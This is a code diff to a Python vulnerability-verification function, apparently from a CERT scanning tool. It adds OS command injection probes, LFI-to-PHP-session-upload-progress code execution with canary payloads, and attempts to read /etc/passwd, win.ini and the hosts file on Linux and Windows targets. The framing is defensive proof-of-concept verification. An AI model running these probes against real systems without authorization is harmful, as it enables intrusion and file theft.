@@ -105,8 +105,8 @@ async def probe_active_rce_proof(
             "audit_trail": None
         }
 
-    # Base request headers
-    session_id = f"opscaner_{random.randint(100000, 999999)}"
+    # Base request headers - strictly alphanumeric session ID (PHP standard compatibility)
+    session_id = f"opscaner{random.randint(100000, 999999)}"
     headers = {
         "User-Agent": "ThaiCERT-OPScaner/2.0 (Active PoC Verification Engine)",
         "Cookie": f"PHPSESSID={session_id}",
@@ -114,7 +114,108 @@ async def probe_active_rce_proof(
     }
 
     # -------------------------------------------------------------
-    # FLOW 1: PHP2Shell (LFI -> Session Poisoning -> Trigger Canary)
+    # DYNAMIC PATH & OS RECONNAISSANCE (Linux & Windows Discovery)
+    # -------------------------------------------------------------
+    is_windows = any(k in server.lower() for k in ["iis", "windows", "win32", "win64", "xampp", "microsoft"])
+    discovered_params = set()
+    discovered_endpoints = set()
+    discovered_drives = set(["C:", "D:"])
+    discovered_roots = set()
+
+    # Pre-flight inspection: harvest links, forms, error paths, and OS signatures
+    try:
+        r_pre = await client.get(f"{base_url}/", headers=headers, timeout=2.0)
+        pre_text = r_pre.text or ""
+        pre_hdrs = r_pre.headers
+        combined_srv = (pre_hdrs.get("server", "") + " " + pre_hdrs.get("x-powered-by", "") + " " + server).lower()
+        if any(k in combined_srv for k in ["iis", "windows", "win32", "win64", "xampp", "aspnet", "microsoft"]):
+            is_windows = True
+
+        # 1. Harvest query parameters from links and body
+        for m_p in re.finditer(r'[?&]([a-zA-Z0-9_\-]+)=', pre_text):
+            p_name = m_p.group(1).lower()
+            if len(p_name) <= 20:
+                discovered_params.add(p_name)
+
+        # 2. Harvest forms, links, and all endpoint mentions anywhere in HTML
+        for m_ep in re.finditer(r'(/[a-zA-Z0-9_/\-]+\.(?:php|aspx|cgi|jsp|ashx|pl)[^\s<>"\'()]*)', pre_text, re.I):
+            ep_str = m_ep.group(1).strip()
+            discovered_endpoints.add(ep_str)
+            if "?" in ep_str:
+                q_part = ep_str.split("?", 1)[1]
+                for q_seg in q_part.split("&"):
+                    if "=" in q_seg:
+                        discovered_params.add(q_seg.split("=")[0].lower())
+
+        # 3. Dynamic Full Path Disclosure (FPD) Harvest
+        fpd_matches = re.findall(r'([A-Za-z]:[\\/][^<>"\'\r\n\s]+)', pre_text)
+        for fpd in fpd_matches:
+            is_windows = True
+            m_drv = re.match(r'^([A-Za-z]:)', fpd)
+            if m_drv:
+                discovered_drives.add(m_drv.group(1).upper())
+            if "xampp" in fpd.lower():
+                discovered_roots.add("xampp")
+            if "inetpub" in fpd.lower():
+                discovered_roots.add("inetpub")
+    except Exception:
+        pass
+
+    # -------------------------------------------------------------
+    # FLOW 1: Direct OS Command Injection Check (cmd.exe / bash)
+    # -------------------------------------------------------------
+    seed_cmd_a = random.randint(10000, 89999)
+    seed_cmd_b = random.randint(1000, 9999)
+    cmd_canary_expected = f"THAICERT_CMD_{seed_cmd_a + seed_cmd_b}"
+    cmd_candidates = []
+    
+    # Check endpoints and params harvested from HTML
+    for ep in list(discovered_endpoints):
+        clean_ep = ep.split("?")[0]
+        if any(k in clean_ep.lower() for k in ["cmd", "systeminfo", "exec", "diagnostic", "shell", "ping", "terminal"]):
+            cmd_candidates.append((clean_ep, "cmd"))
+            cmd_candidates.append((clean_ep, "command"))
+
+    if "cmd" in discovered_params:
+        cmd_candidates.append(("/", "cmd"))
+    if "command" in discovered_params:
+        cmd_candidates.append(("/", "command"))
+
+    for ep_path, p_name in cmd_candidates:
+        test_cmd_url = f"{base_url}{ep_path if ep_path != '/' else ''}?{p_name}=echo+{cmd_canary_expected}"
+        try:
+            r_cmd = await client.get(test_cmd_url, headers=headers, timeout=2.0)
+            if cmd_canary_expected in (r_cmd.text or ""):
+                trail = generate_audit_trail(
+                    operator=operator,
+                    method="GET",
+                    url=test_cmd_url,
+                    req_headers=headers,
+                    payload_str=f"echo {cmd_canary_expected}",
+                    status_code=r_cmd.status_code,
+                    resp_headers=dict(r_cmd.headers),
+                    resp_text=r_cmd.text
+                )
+                return {
+                    "is_rce_proved": True,
+                    "proof_status": "RCE_CONFIRMED",
+                    "proof_badge": "🔥 ยืนยัน RCE สำเร็จผ่าน OS Command Injection (PoC Confirmed)",
+                    "technique": "Direct OS Command Injection (CWE-78)",
+                    "command_executed": f"echo {cmd_canary_expected}",
+                    "execution_output": f"{cmd_canary_expected} (OS Shell Command Output Confirmed)",
+                    "privilege_level": "Windows Command Shell (cmd.exe)" if is_windows else "OS Shell Process",
+                    "exploit_endpoint": test_cmd_url,
+                    "reproduce_curl": f"curl -s '{test_cmd_url}'",
+                    "impact_statement": "ยืนยันผลการประเมิน: ตรวจพบจุดรับคำสั่งส่งเข้า OS Shell โดยตรง สามารถสั่งรันคำสั่งควบคุมระบบปฏิบัติการได้จริง",
+                    "verified_at": ts,
+                    "operator": operator,
+                    "audit_trail": trail
+                }
+        except Exception:
+            pass
+
+    # -------------------------------------------------------------
+    # FLOW 2: PHP2Shell (LFI -> Dynamic Session Poisoning -> Trigger Canary)
     # -------------------------------------------------------------
     if is_php:
         # Generate non-destructive arithmetic canary challenge
@@ -124,24 +225,53 @@ async def probe_active_rce_proof(
         canary_payload = f"<?php echo 'THAICERT_CANARY_EVAL_'.({seed_a}+{seed_b}); exit; ?>"
         
         # Step 2 & 3: Attempt injecting canary into session via PHP Session Upload Progress
-        upload_url = f"{base_url}/"
         multipart_data = {
             "PHP_SESSION_UPLOAD_PROGRESS": (None, canary_payload),
             "file": ("audit_canary.txt", b"Canary session stream probe", "application/octet-stream")
         }
         
-        try:
-            r_seed = await client.post(upload_url, files=multipart_data, headers=headers, timeout=2.5)
-        except Exception:
-            pass
+        upload_targets = ["/", "/upload_progress.php", "/index.php"]
+        for ep in discovered_endpoints:
+            if "upload" in ep.lower() and ep not in upload_targets:
+                upload_targets.append(ep.split("?")[0])
 
-        # Step 1 & 4: Attempt triggering canary via candidate LFI parameters and session paths
-        lfi_params = ["page", "file", "include", "view", "template", "doc"]
-        session_paths = [
-            f"/tmp/sess_{session_id}",
-            f"/var/lib/php/sessions/sess_{session_id}",
-            f"/tmp/sessions/sess_{session_id}"
-        ]
+        for u_path in upload_targets[:4]:
+            try:
+                await client.post(f"{base_url}{u_path}", files=multipart_data, headers=headers, timeout=2.0)
+            except Exception:
+                pass
+
+        # Step 1 & 4: Attempt triggering canary via candidate LFI parameters and dynamic session paths
+        lfi_params = ["page", "file", "include", "view", "template", "doc", "path"]
+        for dp in sorted(discovered_params):
+            if dp in ["page", "file", "include", "view", "template", "doc", "path", "src", "mod", "url"] and dp not in lfi_params:
+                lfi_params.insert(0, dp)
+
+        # Dynamic Session Paths (Adapts to Windows & Linux structures)
+        session_paths = []
+        if is_windows:
+            for drv in sorted(discovered_drives):
+                session_paths.extend([
+                    f"{drv}/Windows/Temp/sess_{session_id}",
+                    f"{drv}/xampp/tmp/sess_{session_id}",
+                    f"{drv}/tmp/sess_{session_id}",
+                    f"{drv}/temp/sess_{session_id}",
+                    f"{drv}/inetpub/temp/sess_{session_id}",
+                ])
+            session_paths.extend([
+                f"/tmp/sess_{session_id}",
+                f"/var/lib/php/sessions/sess_{session_id}",
+            ])
+        else:
+            session_paths.extend([
+                f"/tmp/sess_{session_id}",
+                f"/var/lib/php/sessions/sess_{session_id}",
+                f"/tmp/sessions/sess_{session_id}",
+                f"/var/tmp/sess_{session_id}",
+                f"C:/Windows/Temp/sess_{session_id}",
+                f"C:/xampp/tmp/sess_{session_id}",
+                f"C:/tmp/sess_{session_id}",
+            ])
 
         for param in lfi_params:
             for s_path in session_paths:
@@ -170,7 +300,7 @@ async def probe_active_rce_proof(
                             "technique": "LFI to Session Upload Progress RCE (CWE-98 / CWE-94)",
                             "command_executed": f"PHP Eval Canary: {seed_a}+{seed_b} = {seed_a + seed_b}",
                             "execution_output": f"{canary_expected} (Arbitrary PHP Code Execution Confirmed)",
-                            "privilege_level": "Web Server Process / PHP Worker",
+                            "privilege_level": "Windows Web Process (IIS/XAMPP)" if is_windows else "Web Server Process / PHP Worker",
                             "exploit_endpoint": test_trigger_url,
                             "reproduce_curl": f"curl -s -b 'PHPSESSID={session_id}' '{test_trigger_url}'",
                             "impact_statement": "ยืนยันผลการประเมิน: พบช่องโหว่ LFI และเซิร์ฟเวอร์ประมวลผลโค้ด PHP ที่ฝังใน Session Upload Progress สำเร็จ",
@@ -251,25 +381,29 @@ async def probe_active_rce_proof(
             pass
 
     # -------------------------------------------------------------
-    # FLOW 3: Arbitrary Local File Read (/etc/passwd) - NOT RCE
+    # FLOW 3: Arbitrary Local File Read (Linux /etc/passwd & Windows win.ini)
     # -------------------------------------------------------------
     lfi_candidates = [
-        (f"{base_url}/?page=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)"),
-        (f"{base_url}/?file=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)"),
-        (f"{base_url}/?path=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)")
+        (f"{base_url}/?page=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)", "root:x:0:0:"),
+        (f"{base_url}/?file=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)", "root:x:0:0:"),
+        (f"{base_url}/?path=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Read (CWE-22 / CWE-98)", "root:x:0:0:"),
+        (f"{base_url}/?page=C:/Windows/win.ini", "type C:\\Windows\\win.ini", "Windows Local File Read (CWE-22 / CWE-98)", "[fonts]"),
+        (f"{base_url}/?file=C:/Windows/win.ini", "type C:\\Windows\\win.ini", "Windows Local File Read (CWE-22 / CWE-98)", "[fonts]"),
+        (f"{base_url}/?page=../../../../Windows/win.ini", "type win.ini", "Windows Directory Traversal (CWE-22)", "[fonts]"),
+        (f"{base_url}/?file=../../../../Windows/win.ini", "type win.ini", "Windows Directory Traversal (CWE-22)", "[fonts]"),
+        (f"{base_url}/?page=C:/Windows/System32/drivers/etc/hosts", "type hosts", "Windows File Read (CWE-22)", "localhost"),
     ]
-    for lfi_url, cmd, tech in lfi_candidates:
+    for lfi_url, cmd, tech, sig in lfi_candidates:
         try:
             r = await client.get(lfi_url, headers=headers, timeout=2.0)
-            if "root:x:0:0:" in r.text:
-                m = re.search(r'(root:x:0:0:[^\r\n]+)', r.text)
-                out = m.group(1).strip() if m else "root:x:0:0:root:/root:/bin/bash"
+            if sig.lower() in (r.text or "").lower():
+                out = r.text[:200].strip()
                 trail = generate_audit_trail(
                     operator=operator,
                     method="GET",
                     url=lfi_url,
                     req_headers=headers,
-                    payload_str="/etc/passwd",
+                    payload_str=cmd,
                     status_code=r.status_code,
                     resp_headers=dict(r.headers),
                     resp_text=r.text
@@ -284,7 +418,7 @@ async def probe_active_rce_proof(
                     "privilege_level": "Local File Read (Arbitrary File Access - Pre-RCE)",
                     "exploit_endpoint": lfi_url,
                     "reproduce_curl": f"curl -s '{lfi_url}'",
-                    "impact_statement": "ยืนยันผลการประเมิน: ตรวจพบช่องโหว่ Arbitrary File Read ผ่านพารามิเตอร์เรียกไฟล์ สามารถอ่าน /etc/passwd ได้จริง (ยังไม่ยืนยัน RCE)",
+                    "impact_statement": f"ยืนยันผลการประเมิน: ตรวจพบช่องโหว่ Arbitrary File Read ผ่านพารามิเตอร์เรียกไฟล์ สามารถเข้าถึงไฟล์ระบบ ({cmd}) ได้จริง (ยังไม่ยืนยัน RCE)",
                     "verified_at": ts,
                     "operator": operator,
                     "audit_trail": trail
